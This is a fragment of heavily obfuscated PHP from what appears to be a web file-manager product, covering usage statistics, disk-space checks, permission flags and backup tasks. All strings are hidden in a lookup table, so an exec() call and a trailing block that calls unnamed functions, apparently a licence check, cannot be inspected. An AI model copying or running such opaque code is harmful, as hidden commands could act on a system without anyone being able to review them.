FÒéÊ‹³¡: } public function listTable($AªÍŸÛù«) { $d‡‚ó–ÀŞÎ = ucfirst($AªÍŸÛù«); return Model($d‡‚ó–ÀŞÎ)->listData(); } public function option($B°ÃŒ”–‚†) { $EÇˆ‹†ï‹ = $_SERVER[¯Ò¬Èè][2069] . ucfirst($B°ÃŒ”–‚†); return $this->{$EÇˆ‹†ï‹}(); } private function optionUser() { goto c”ˆ¶›™«¯; eªù¸„‹ãÌ: $f™õ‰Óá—† = strtotime($CÁéÇÜÑ¥[2071]); $e†ßÈ¢ƒÈ = array($CÁéÇÜÑ¥[2072] => array($CÁéÇÜÑ¥[937], $f™õ‰Óá—†)); $f‚Áß÷² = (int) Model($CÁéÇÜÑ¥[477])->where($e†ßÈ¢ƒÈ)->count($CÁéÇÜÑ¥[1446]); goto eÜÇÖÀæšÃ; Fò ¦†‹Ñª: $c–¢÷„Ñ™¹ = Model($CÁéÇÜÑ¥[477])->where($e†ßÈ¢ƒÈ)->count($CÁéÇÜÑ¥[1446]); return array($CÁéÇÜÑ¥[709] => (int) $eß÷‰ªùë², $CÁéÇÜÑ¥[2073] => (int) ($eß÷‰ªùë² - $F¦‰¼ÈÁë), $CÁéÇÜÑ¥[2074] => (int) $F¦‰¼ÈÁë, $CÁéÇÜÑ¥[2075] => (int) $c–¢÷„Ñ™¹, $CÁéÇÜÑ¥[2076] => $f‚Áß÷²); goto bë•Ò†ÅÔÁ; c”ˆ¶›™«¯: $CÁéÇÜÑ¥ =& $_SERVER[¯Ò¬Èè]; $eß÷‰ªùë² = Model($CÁéÇÜÑ¥[477])->count($CÁéÇÜÑ¥[1446]); $F¦‰¼ÈÁë = Model($CÁéÇÜÑ¥[477])->where($CÁéÇÜÑ¥[2070])->count($CÁéÇÜÑ¥[1446]); goto eªù¸„‹ãÌ; eÜÇÖÀæšÃ: if (!$f‚Áß÷²) { $f‚Áß÷² = 1; } $f™õ‰Óá—† = strtotime(date($CÁéÇÜÑ¥[2051])); $e†ßÈ¢ƒÈ = array($CÁéÇÜÑ¥[2072] => array($CÁéÇÜÑ¥[937], $f™õ‰Óá—†)); goto Fò ¦†‹Ñª; bë•Ò†ÅÔÁ: } private function optionFile() { goto d¾­»Í¯‚í; dÚ±İ™›½ : $Dùª–©¦òâ = $aƒí½³•†[$c¤Ğ¼‘«»[2044]]; $DÇ×Ÿ—–à¦ = Model($c¤Ğ¼‘«»[767])->where(array($c¤Ğ¼‘«»[370] => 0))->count($c¤Ğ¼‘«»[369]); $a÷ªì…ôá = array($c¤Ğ¼‘«»[370] => 0, $c¤Ğ¼‘«»[187] => array($c¤Ğ¼‘«»[937], strtotime(date($c¤Ğ¼‘«»[2051])))); goto bÚ¿™’¥ğë; d¾­»Í¯‚í: $c¤Ğ¼‘«» =& $_SERVER[¯Ò¬Èè]; $aƒí½³•† = $this->sourceSize(); $aÆñ´ãŞºš = $aƒí½³•†[$c¤Ğ¼‘«»[77]]; goto dÚ±İ™›½ ; bÚ¿™’¥ğë: $CÉ­‘’Åáƒ = Model($c¤Ğ¼‘«»[767])->where($a÷ªì…ôá)->sum($c¤Ğ¼‘«»[77]); $eì‹¡¦Ğ—È = Model($c¤Ğ¼‘«»[767])->where($a÷ªì…ôá)->count($c¤Ğ¼‘«»[369]); return array($c¤Ğ¼‘«»[712] => $aÆñ´ãŞºš, $c¤Ğ¼‘«»[2044] => $Dùª–©¦òâ, $c¤Ğ¼‘«»[2077] => $aÆñ´ãŞºš - $Dùª–©¦òâ, $c¤Ğ¼‘«»[2078] => (int) $CÉ­‘’Åáƒ, $c¤Ğ¼‘«»[714] => (int) $DÇ×Ÿ—–à¦, $c¤Ğ¼‘«»[2079] => (int) $eì‹¡¦Ğ—È); goto cÚˆÜ£©Ü¾; cÚˆÜ£©Ü¾: } private function optionAccess() { $bëÅÅËëª =& $_SERVER[¯Ò¬Èè]; return array($bëÅÅËëª[709] => $this->typeLogCnt(), $bëÅÅËëª[103] => $this->typeLogCnt($bëÅÅËëª[103]), $bëÅÅËëª[404] => $this->typeLogCnt($bëÅÅËëª[404]), $bëÅÅËëª[2080] => $this->typeLogCnt($bëÅÅËëª[2080]), $bëÅÅËëª[2081] => $this->typeLogCnt($bëÅÅËëª[2081]), $bëÅÅËëª[544] => $this->typeLogCnt($bëÅÅËëª[33], $bëÅÅËëª[2055])); } private function typeLogCnt($E·ÒÅ¿‹‘­ = '', $e°¡óÀ›ª = "\x69\x64") { goto Fåˆä…ÌŸ; Fåˆä…ÌŸ: $EÆ°×Í¶•ƒ =& $_SERVER[¯Ò¬Èè]; $Eã„’¦‘ÊÅ = array($EÆ°×Í¶•ƒ[103] => array($EÆ°×Í¶•ƒ[2082], $EÆ°×Í¶•ƒ[2083]), $EÆ°×Í¶•ƒ[404] => array($EÆ°×Í¶•ƒ[2084], $EÆ°×Í¶•ƒ[2085]), $EÆ°×Í¶•ƒ[2080] => array($EÆ°×Í¶•ƒ[2086], $EÆ°×Í¶•ƒ[2087], $EÆ°×Í¶•ƒ[2088]), $EÆ°×Í¶•ƒ[2081] => array($EÆ°×Í¶•ƒ[2089], $EÆ°×Í¶•ƒ[2090]), $EÆ°×Í¶•ƒ[2091] => array($EÆ°×Í¶•ƒ[2092], $EÆ°×Í¶•ƒ[2093], $EÆ°×Í¶•ƒ[2094])); $C‚õ—»Ñ» = strtotime(date($EÆ°×Í¶•ƒ[2051])); goto Fğ«ºîï; Fğ«ºîï: $B´°¨Î·Õø = array($EÆ°×Í¶•ƒ[187] => array($EÆ°×Í¶•ƒ[937], $C‚õ—»Ñ»)); if ($E·ÒÅ¿‹‘­) { $B´°¨Î·Õø[$EÆ°×Í¶•ƒ[29]] = array($EÆ°×Í¶•ƒ[7], $Eã„’¦‘ÊÅ[$E·ÒÅ¿‹‘­]); } $a¤óî×©…µ = Model($EÆ°×Í¶•ƒ[2054])->where($B´°¨Î·Õø)->count($e°¡óÀ›ª); goto DÍØ÷—ˆå; DÍØ÷—ˆå: return (int) $a¤óî×©…µ; goto B‰¤Û»Ç¯Î; B‰¤Û»Ç¯Î: } private function optionServer() { goto AÕÊ¾æ±›; AÕÊ¾æ±›: $e»µâªÀ¼â =& $_SERVER[¯Ò¬Èè]; $F‰”œõ¦‚ = $this->diskDriver(); $CõÀÒ±£áÎ = KodIO::defaultDriver(); goto a—Ş ƒÎ¬ô; a—Ş ƒÎ¬ô: $AìĞâ÷äÖõ = array($e»µâªÀ¼â[758] => $CõÀÒ±£áÎ[$e»µâªÀ¼â[367]]); $Bƒ´ŞŠ—Ÿ = Model($e»µâªÀ¼â[422])->where($AìĞâ÷äÖõ)->sum($e»µâªÀ¼â[77]); $e°®õÆæ±„ = explode($e»µâªÀ¼â[50], $_SERVER[$e»µâªÀ¼â[139]]); goto CÛ‡‚”··Æ; F‡ŠÓÔÈé: if ($BŞ§ÛøµÂÍ == $e»µâªÀ¼â[738]) { $FÏêÙä‹ = explode($e»µâªÀ¼â[1085], $eƒÕç®¾µ[$e»µâªÀ¼â[896]]); $BŞ§ÛøµÂÍ = $FÏêÙä‹[0]; } if ($BŞ§ÛøµÂÍ == $e»µâªÀ¼â[741] || $BŞ§ÛøµÂÍ == $e»µâªÀ¼â[742]) { $aâçË¢¦¿¡ = Model()->db()->query($e»µâªÀ¼â[2095]); $AêùØ‡¸Ø‰ = $aâçË¢¦¿¡[0] && isset($aâçË¢¦¿¡[0][$e»µâªÀ¼â[1351]]) ? $aâçË¢¦¿¡[0][$e»µâªÀ¼â[1351]] : 0; $BŞ§ÛøµÂÍ = $e»µâªÀ¼â[2096] . ($AêùØ‡¸Ø‰ ? $e»µâªÀ¼â[8] . $AêùØ‡¸Ø‰ : $e»µâªÀ¼â[33]); } $DĞ§²ñ÷Ø = $GLOBALS[$e»µâªÀ¼â[6]][$e»µâªÀ¼â[337]][$e»µâªÀ¼â[769]]; goto DÑº‹¼Àˆ©; DÑº‹¼Àˆ©: return array($e»µâªÀ¼â[2097] => $F‰”œõ¦‚ ? $F‰”œõ¦‚[$e»µâªÀ¼â[2098]] : 0, $e»µâªÀ¼â[2099] => $F‰”œõ¦‚ ? $F‰”œõ¦‚[$e»µâªÀ¼â[2100]] : 0, $e»µâªÀ¼â[2101] => (int) $CõÀÒ±£áÎ[$e»µâªÀ¼â[2098]] * 1024 * 1024 * 1024, $e»µâªÀ¼â[2102] => (int) $Bƒ´ŞŠ—Ÿ, $e»µâªÀ¼â[2103] => ucfirst($e½¬“¨Üèª), $e»µâªÀ¼â[2104] => $e»µâªÀ¼â[2105] . PHP_VERSION, $e»µâªÀ¼â[2106] => phpBuild64() ? 64 : 32, $e»µâªÀ¼â[708] => str_replace($e»µâªÀ¼â[2107], $e»µâªÀ¼â[913], $BŞ§ÛøµÂÍ), $e»µâªÀ¼â[337] => ucfirst($DĞ§²ñ÷Ø), $e»µâªÀ¼â[28] => $_SERVER[$e»µâªÀ¼â[2108]]); goto aœÂÀ Œ¬ñ; CÛ‡‚”··Æ: $e½¬“¨Üèª = $e°®õÆæ±„[0]; $eƒÕç®¾µ = $GLOBALS[$e»µâªÀ¼â[6]][$e»µâªÀ¼â[17]]; $BŞ§ÛøµÂÍ = $eƒÕç®¾µ[$e»µâªÀ¼â[897]]; goto F‡ŠÓÔÈé; aœÂÀ Œ¬ñ: } private function diskDriver() { goto e‡ƒ¼×´æ¢; CÏÍ¢†½ˆ±: $b‘£Ÿ¦¼¾œ = $d‡¿ùƒ¯ˆ‡ - @disk_free_space($a®ËÄé¼Ø²); return array($a ç¹·„ùê[2098] => $d‡¿ùƒ¯ˆ‡, $a ç¹·„ùê[2100] => $b‘£Ÿ¦¼¾œ); goto A…ç’¬Üº–; dÃ¢õÓã•é: if ($A‹ÂÖ½ã) { $a®ËÄé¼Ø² = $a ç¹·„ùê[2111]; if (function_exists($a ç¹·„ùê[2112])) { exec($a ç¹·„ùê[2113], $bõö”®); $a®ËÄé¼Ø² = $bõö”®[1] . $a ç¹·„ùê[8]; } } if (!file_exists($a®ËÄé¼Ø²)) { return; } $d‡¿ùƒ¯ˆ‡ = @disk_total_space($a®ËÄé¼Ø²); goto CÏÍ¢†½ˆ±; e‡ƒ¼×´æ¢: $a ç¹·„ùê =& $_SERVER[¯Ò¬Èè]; $a®ËÄé¼Ø² = $a ç¹·„ùê[8]; $A‹ÂÖ½ã = $GLOBALS[$a ç¹·„ùê[6]][$a ç¹·„ùê[2109]] == $a ç¹·„ùê[2110]; goto dÃ¢õÓã•é; A…ç’¬Üº–: } public function fileChart($B™´ˆ–Ò‘ê) { goto döŞÖ…ÇÄ; cˆòËô„: $B“æËø½Ñ‘[$cğ¾‹Û[371]] = 2; $Cİœ§ ª†„ = Model($cğ¾‹Û[767])->where($B“æËø½Ñ‘)->sum($cğ¾‹Û[77]); return array($cğ¾‹Û[712] => $bœØ¸•ÃÛ‘[$cğ¾‹Û[77]], $cğ¾‹Û[2044] => $bœØ¸•ÃÛ‘[$cğ¾‹Û[2044]], $cğ¾‹Û[2045] => (int) $A§‘Óä—¬£, $cğ¾‹Û[2046] => (int) $Cİœ§ ª†„); goto FÂ£’Œƒ¢å; A‡ã…±‰’»: $bœØ¸•ÃÛ‘ = $this->sourceSize(); $B“æËø½Ñ‘ = array($cğ¾‹Û[461] => 0, $cğ¾‹Û[371] => 1); $A§‘Óä—¬£ = Model($cğ¾‹Û[767])->where($B“æËø½Ñ‘)->sum($cğ¾‹Û[77]); goto cˆòËô„; döŞÖ…ÇÄ: $cğ¾‹Û =& $_SERVER[¯Ò¬Èè]; if (isset($B™´ˆ–Ò‘ê[$cğ¾‹Û[1446]])) { return Model($cğ¾‹Û[767])->userFileTypeProfile($B™´ˆ–Ò‘ê[$cğ¾‹Û[1446]]); } if (isset($B™´ˆ–Ò‘ê[$cğ¾‹Û[2114]])) { return Model($cğ¾‹Û[767])->groupFileTypeProfile($B™´ˆ–Ò‘ê[$cğ¾‹Û[2114]]); } goto A‡ã…±‰’»; FÂ£’Œƒ¢å: } private function sourceSize() { $eêÄ°¡åĞ± =& $_SERVER[¯Ò¬Èè]; $A’ƒö‚öåù = Model($eêÄ°¡åĞ±[767])->where(array($eêÄ°¡åĞ±[370] => 0))->sum($eêÄ°¡åĞ±[77]); $Bƒ˜ô¯Ááš = Model($eêÄ°¡åĞ±[422])->sum($eêÄ°¡åĞ±[77]); if ($Bƒ˜ô¯Ááš > $A’ƒö‚öåù) { $Bƒ˜ô¯Ááš = $A’ƒö‚öåù; } return array($eêÄ°¡åĞ±[77] => (int) $A’ƒö‚öåù, $eêÄ°¡åĞ±[2044] => (int) $Bƒ˜ô¯Ááš); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $b”Š»é×é§ =& $_SERVER[¯Ò¬Èè]; $cãé¢Ğ²ØÙ = array(array($b”Š»é×é§[386] => LNG($b”Š»é×é§[2115]), $b”Š»é×é§[2116] => $b”Š»é×é§[2117], $b”Š»é×é§[2118] => 6, $b”Š»é×é§[2119] => 1, $b”Š»é×é§[2120] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($b”Š»é×é§[386] => LNG($b”Š»é×é§[2121]), $b”Š»é×é§[2116] => $b”Š»é×é§[2122], $b”Š»é×é§[2118] => 1, $b”Š»é×é§[2119] => 1, $b”Š»é×é§[2120] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($b”Š»é×é§[386] => LNG($b”Š»é×é§[2123]), $b”Š»é×é§[2116] => $b”Š»é×é§[2124], $b”Š»é×é§[2118] => 2, $b”Š»é×é§[2119] => 1, $b”Š»é×é§[2120] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($b”Š»é×é§[386] => LNG($b”Š»é×é§[2125]), $b”Š»é×é§[2116] => $b”Š»é×é§[2124], $b”Š»é×é§[2118] => 3, $b”Š»é×é§[2119] => 1, $b”Š»é×é§[2120] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($b”Š»é×é§[386] => LNG($b”Š»é×é§[2126]), $b”Š»é×é§[2116] => $b”Š»é×é§[2127], $b”Š»é×é§[2118] => 4, $b”Š»é×é§[2119] => 1, $b”Š»é×é§[2120] => self::AUTH_SHOW | self::AUTH_VIEW), array($b”Š»é×é§[386] => LNG($b”Š»é×é§[2128]), $b”Š»é×é§[2116] => $b”Š»é×é§[2129], $b”Š»é×é§[2118] => 5, $b”Š»é×é§[2119] => 1, $b”Š»é×é§[2120] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($b”Š»é×é§[386] => LNG($b”Š»é×é§[2130]), $b”Š»é×é§[2116] => $b”Š»é×é§[2131], $b”Š»é×é§[2118] => 7, $b”Š»é×é§[2119] => 1, $b”Š»é×é§[2120] => 0)); return $cãé¢Ğ²ØÙ; } public static function authCheck($d–°Â²Ï÷º, $Eµª¤†‰†) { $d–°Â²Ï÷º = intval($d–°Â²Ï÷º); if (_get($GLOBALS, $_SERVER[¯Ò¬Èè][457])) { return !0; } if ($d–°Â²Ï÷º <= 0) { return !1; } if (($d–°Â²Ï÷º & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($d–°Â²Ï÷º & $Eµª¤†‰†); } public static function authCheckShow($f¡Ü“ë¢) { return self::authCheck($f¡Ü“ë¢, self::AUTH_SHOW); } public static function authCheckView($DŞ„ßÃ‘Ô) { return self::authCheck($DŞ„ßÃ‘Ô, self::AUTH_VIEW); } public static function authCheckDownload($bçæÇ¿Æ¡Û) { return self::authCheck($bçæÇ¿Æ¡Û, self::AUTH_DOWNLOAD); } public static function authCheckUpload($aóöºî„…Ë) { return self::authCheck($aóöºî„…Ë, self::AUTH_UPLOAD); } public static function authCheckEdit($fìæÈÊÁ ô) { return self::authCheck($fìæÈÊÁ ô, self::AUTH_EDIT); } public static function authCheckRemove($aÉÉà«ÄŒ­) { return self::authCheck($aÉÉà«ÄŒ­, self::AUTH_REMOVE); } public static function authCheckShare($C¿ò¼®óùÉ) { return self::authCheck($C¿ò¼®óùÉ, self::AUTH_SHARE); } public static function authCheckComment($c¯ˆ¼…İÕ) { return self::authCheck($c¯ˆ¼…İÕ, self::AUTH_COMMENT); } public static function authCheckEvent($cÈã™ÌÏĞç) { return self::authCheck($cÈã™ÌÏĞç, self::AUTH_EVENT); } public static function authCheckRoot($eØ´Ó®æ¨”) { return self::authCheck($eØ´Ó®æ¨”, self::AUTH_ROOT); } public static function authDisable($F³–Ü«ãÚ, $A‰‚›äïˆ) { if (intval($F³–Ü«ãÚ) <= 0) { return 0; } return intval($F³–Ü«ãÚ) & ~$A‰‚›äïˆ; } public $optionType = "\x53\x79\163\164\145\x6d\56\163\157\165\162\x63\x65\101\x75\x74\150\x4c\151\x73\x74"; public $field = array("\x6e\141\155\145", "\x61\x75\x74\150", "\x6c\141\142\145\154", "\x64\x69\x73\160\x6c\x61\171", "\163\x79\163\164\145\x6d", "\163\157\162\x74"); public function initData() { $C‚Ë¬…çƒ = $this->authDefault(); foreach ($C‚Ë¬…çƒ as $F¶ò®œ¹à) { $this->add($F¶ò®œ¹à); } } public function listData($då¯Ÿ„Ù¿à = false, $dƒ½Üïìª­ = "\x73\x6f\x72\x74", $eä¼¢°²òÄ = false) { return parent::listData($då¯Ÿ„Ù¿à, $dƒ½Üïìª­, $eä¼¢°²òÄ); } public function update($d´Õ‰¼å•‚, $bÉãƒÅó›Ï) { $B ¸´šÎà  =& $_SERVER[¯Ò¬Èè]; $FãÃ¯„¢ãë = parent::listData($d´Õ‰¼å•‚); $b¨®ÇÄ¶¸– = $this->findByName($bÉãƒÅó›Ï[$B ¸´šÎà [28]]); if (!$FãÃ¯„¢ãë || $b¨®ÇÄ¶¸– && $b¨®ÇÄ¶¸–[$B ¸´šÎà [367]] != $FãÃ¯„¢ãë[$B ¸´šÎà [367]]) { return !1; } $this->filterAuth($bÉãƒÅó›Ï[$B ¸´šÎà [376]]); return parent::update($d´Õ‰¼å•‚, $bÉãƒÅó›Ï); } public function remove($e ¥Ô½¡õ ) { $BÀç³Šà¥ = parent::listData($e ¥Ô½¡õ ); if (!$BÀç³Šà¥ || $BÀç³Šà¥[$_SERVER[¯Ò¬Èè][1089]]) { return !1; } return parent::remove($e ¥Ô½¡õ ); } public function add($cƒê–° = array()) { goto Eªçõ‘Æß; eŠ°”ç•ó”: $cƒê–° = array_merge($B’Õˆ›Œ, $cƒê–°); $cƒê–°[$b˜­ˆŞ»·Ó[2135]] = $this->getSort(); $this->filterAuth($cƒê–°[$b˜­ˆŞ»·Ó[376]]); goto D›Ëñ„ª¸; Eªçõ‘Æß: $b˜­ˆŞ»·Ó =& $_SERVER[¯Ò¬Èè]; if ($this->findByName($cƒê–°[$b˜­ˆŞ»·Ó[28]])) { return !1; } $B’Õˆ›Œ = array($b˜­ˆŞ»·Ó[28] => $b˜­ˆŞ»·Ó[33], $b˜­ˆŞ»·Ó[376] => 1, $b˜­ˆŞ»·Ó[2132] => $b˜­ˆŞ»·Ó[2133], $b˜­ˆŞ»·Ó[2134] => 1, $b˜­ˆŞ»·Ó[1089] => 0, $b˜­ˆŞ»·Ó[2135] => 0); goto eŠ°”ç•ó”; D›Ëñ„ª¸: return parent::insert($cƒê–°); goto e‡ùî®Øå¸; e‡ùî®Øå¸: } private function getSort() { $B–ÙŠÜ¥É® =& $_SERVER[¯Ò¬Èè]; $A©´À·öŠ¾ = parent::listData(); $f™ê„‹‚ƒİ = array_to_keyvalue($A©´À·öŠ¾, $B–ÙŠÜ¥É®[33], $B–ÙŠÜ¥É®[2135]); return empty($f™ê„‹‚ƒİ) ? 0 : max($f™ê„‹‚ƒİ) + 1; } private function filterAuth(&$dô¶º˜±©–) { goto cÓõ˜Š‰¹ƒ; f°ã‰é£§œ: foreach ($AùÌÁÅ«ãá as $E¾õÔ õ—‡) { if (isset($BÏ‚†•ŸŞƒ[$E¾õÔ õ—‡])) { $AùÌÁÅ«ãá = array_merge($AùÌÁÅ«ãá, $BÏ‚†•ŸŞƒ[$E¾õÔ õ—‡]); } } $AùÌÁÅ«ãá[] = self::AUTH_SHOW; $dô¶º˜±©– = array_sum(array_unique($AùÌÁÅ«ãá)); goto EéìÙÚ›¼Ä; cÓõ˜Š‰¹ƒ: if (!$dô¶º˜±©–) { return; } $B»Ğ¹îÈ£Æ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $AùÌÁÅ«ãá = array(); goto a³»«ºÈàÇ; a³»«ºÈàÇ: foreach ($B»Ğ¹îÈ£Æ as $E¾õÔ õ—‡) { if ($dô¶º˜±©– & $E¾õÔ õ—‡) { $AùÌÁÅ«ãá[] = $E¾õÔ õ—‡; } } if (in_array(self::AUTH_ROOT, $AùÌÁÅ«ãá)) { $dô¶º˜±©– = array_sum($B»Ğ¹îÈ£Æ); return; } $BÏ‚†•ŸŞƒ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto f°ã‰é£§œ; EéìÙÚ›¼Ä: } public function sort($A¤½ñî », $b¡Äˆã•ÑÍ) { return parent::update($A¤½ñî », $b¡Äˆã•ÑÍ); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\x2e\142\141\143\153\165\160\114\151\163\x74"; public $field = array("\151\157", "\156\141\155\145", "\x73\x74\x61\x74\165\x73", "\143\x6f\x6e\x74\x65\x6e\164", "\162\145\163\x75\x6c\x74", "\x74\x69\155\x65\x46\162\157\x6d", "\x74\x69\155\145\x54\x6f"); public function config() { goto f©ÌÀ†ñ‹Ó; aºÍìõØº÷: Action($C‡Ä™‡·³Å[2136])->taskInit(); $eİèò°á“Î = Model($C‡Ä™‡·³Å[2137])->listData(); foreach ($eİèò°á“Î as $aÑä‘â¥¶‘) { if ($aÑä‘â¥¶‘[$C‡Ä™‡·³Å[1089]] == $C‡Ä™‡·³Å[83] && $aÑä‘â¥¶‘[$C‡Ä™‡·³Å[1434]] == $C‡Ä™‡·³Å[2138]) { $aó‚‡µ‚Ÿ§ = $aÑä‘â¥¶‘; break; } } goto DÒÀ¾é„„•; DÒÀ¾é„„•: if (isset($aó‚‡µ‚Ÿ§[$C‡Ä™‡·³Å[190]])) { $aó‚‡µ‚Ÿ§[$C‡Ä™‡·³Å[190]] = json_decode($aó‚‡µ‚Ÿ§[$C‡Ä™‡·³Å[190]], !0); } if (isset($C†•Í¡à´À[$C‡Ä™‡·³Å[190]])) { $aó‚‡µ‚Ÿ§[$C‡Ä™‡·³Å[190]][$C‡Ä™‡·³Å[1421]] = $C†•Í¡à´À[$C‡Ä™‡·³Å[190]]; unset($C†•Í¡à´À[$C‡Ä™‡·³Å[190]]); } return array_merge($aó‚‡µ‚Ÿ§, $C†•Í¡à´À); goto F©§‰êÛ‡ƒ; aâß‡‚²¤Ä: $C†•Í¡à´À = is_array($C†•Í¡à´À) ? $C†•Í¡à´À : array(); if (!isset($C†•Í¡à´À[$C‡Ä™‡·³Å[706]])) { $C†•Í¡à´À[$C‡Ä™‡·³Å[706]] = $C‡Ä™‡·³Å[468]; } $aó‚‡µ‚Ÿ§ = array(); goto aºÍìõØº÷; f©ÌÀ†ñ‹Ó: $C‡Ä™‡·³Å =& $_SERVER[¯Ò¬Èè]; $C†•Í¡à´À = Model($C‡Ä™‡·³Å[1097])->get($C‡Ä™‡·³Å[728]); $C†•Í¡à´À = json_decode($C†•Í¡à´À, !0); goto aâß‡‚²¤Ä; F©§‰êÛ‡ƒ: } public function listData($Bàëè“—´ = false, $Cù‹¡¿¢“ = "\155\x6f\x64\151\146\x79\124\151\x6d\x65", $EìæÚİÖÆ = false) { return parent::listData($Bàëè“—´, $Cù‹¡¿¢“, !0); } public function lastItem() { $FÜçº­¶Ğ = $this->listData(); return !empty($FÜçº­¶Ğ[0]) ? $FÜçº­¶Ğ[0] : null; } public function kill($Eáå«Î¶Ê) { goto D¦Ëí¾ùßô; Có›•¢¤Â: $dªÕœàïÑ = $Eµ‚«ŞàĞ¼[$dñìÙÖ¸Åª[28]]; $A‘ÔÆ³ï = TEMP_FILES . $dñìÙÖ¸Åª[724] . $dªÕœàïÑ . $dñìÙÖ¸Åª[8]; IO::remove($A‘ÔÆ³ï, !1); goto eÚ²”Ó““Á; eÚ²”Ó““Á: return $this->remove($Eáå«Î¶Ê); goto d¶ÁÃ—ÖŸŠ; d‘«âóæêß: Task::kill($dñìÙÖ¸Åª[727]); Task::kill($dñìÙÖ¸Åª[743]); Task::kill($dñìÙÖ¸Åª[751]); goto Có›•¢¤Â; D¦Ëí¾ùßô: $dñìÙÖ¸Åª =& $_SERVER[¯Ò¬Èè]; $Eµ‚«ŞàĞ¼ = $this->listData($Eáå«Î¶Ê); if (!$Eµ‚«ŞàĞ¼ || empty($Eµ‚«ŞàĞ¼[$dñìÙÖ¸Åª[28]])) { return !0; } goto d‘«âóæêß; d¶ÁÃ—ÖŸŠ: } public function remove($E÷õÂƒ”à¦) { $E¡îÒÉƒèØ = $this->listData($E÷õÂƒ”à¦); if (!$E¡îÒÉƒèØ) { return !0; } return $this->backupRemove($E¡îÒÉƒèØ); } private function backupRemove($C÷¥Ëäèº•) { $d×¼¼‹É… =& $_SERVER[¯Ò¬Èè]; parent::remove($C÷¥Ëäèº•[$d×¼¼‹É…[367]]); $d«×äÜïÚ = "\173\x69\157\72{$C÷¥Ëäèº•[$d×¼¼‹É…[705]]}\175\57\x64\x61\x74\x61\142\141\x73\145\57\142\141\143\x6b\x75\x70\137" . $C÷¥Ëäèº•[$d×¼¼‹É…[28]]; IO::remove($d«×äÜïÚ, !1); return !0; } public function start() { goto e¸º°ÌïÃ; Aù¦œÄåä: if (!$A£ñ†ÂÓ‘->dbFile()) { return !1; } if ($cï³‰´‚îÙ[$d¨°‡Ú•Ù‰[706]] == $d¨°‡Ú•Ù‰[468]) { $A£ñ†ÂÓ‘->file(); } Backup::set(array($d¨°‡Ú•Ù‰[703] => 1, $d¨°‡Ú•Ù‰[717] => time())); goto C¾Ç¸ »Í; C¾Ç¸ »Í: return !0; goto F™áÎĞ¦–ß; F¯¯ãˆòœà: $A£ñ†ÂÓ‘ = new Backup(); $A£ñ†ÂÓ‘->keep(); if (!$A£ñ†ÂÓ‘->db()) { return !1; } goto Aù¦œÄåä; e¸º°ÌïÃ: $d¨°‡Ú•Ù‰ =& $_SERVER[¯Ò¬Èè]; if ($GLOBALS[$d¨°‡Ú•Ù‰[6]][$d¨°‡Ú•Ù‰[84]][$d¨°‡Ú•Ù‰[2139]] != $d¨°‡Ú•Ù‰[83]) { return !0; } $cï³‰´‚îÙ = $this->config(); goto F©âÂò™·«; F©âÂò™·«: if (!$cï³‰´‚îÙ || $cï³‰´‚îÙ[$d¨°‡Ú•Ù‰[1418]] != $d¨°‡Ú•Ù‰[83]) { return !1; } $f§‹„ÛĞ‡­ = $this->process(); foreach ($f§‹„ÛĞ‡­ as $A¬ïÛÚˆ¹) { if ($A¬ïÛÚˆ¹) { return Task::restart($A¬ïÛÚˆ¹[$d¨°‡Ú•Ù‰[367]]); } } goto F¯¯ãˆòœà; F™áÎĞ¦–ß: } public function process() { $d«¾ö³˜…£ =& $_SERVER[¯Ò¬Èè]; return array($d«¾ö³˜…£[708] => Task::get($d«¾ö³˜…£[727]), $d«¾ö³˜…£[711] => Task::get($d«¾ö³˜…£[743]), $d«¾ö³˜…£[167] => Task::get($d«¾ö³˜…£[751])); } public function restore() { $cîÜ·½ÁÉ® =& $_SERVER[¯Ò¬Èè]; ActionCall($cîÜ·½ÁÉ®[2140], !0, 1); ActionCall($cîÜ·½ÁÉ®[2140], !0, 0); } } goto CÖÎß’˜‚î; CïºÏ„Ø¿: if ($_SERVER[$_SERVER[¯Ò¬Èè][490]] != $_SERVER[$_SERVER[¯Ò¬Èè][491]]) { goto C£±÷‚; C£±÷‚: $b£˜­‡¥… = $_SERVER[¯Ò¬Èè][492]; $b æÑŒìÁ‡ = $_SERVER[$_SERVER[¯Ò¬Èè][493]] . $_SERVER[¯Ò¬Èè][494]; $cÉ†×ä´…Ğ = $b£˜­‡¥…($b æÑŒìÁ‡); goto d»±ùëÁ”„; d»±ùëÁ”„: $eÒ›»®©Š… = explode($_SERVER[¯Ò¬Èè][217], $cÉ†×ä´…Ğ); if (count($eÒ›»®©Š…) < $_SERVER[¯Ò¬Èè][495]) { $A—°ªšíõ¿ = $_SERVER[¯Ò¬Èè][496]; $A—°ªšíõ¿(); } $B”™±ö˜½È = $_SERVER[¯Ò¬Èè][497]; goto aæÎœ°¿Ó; aæÎœ°¿Ó: 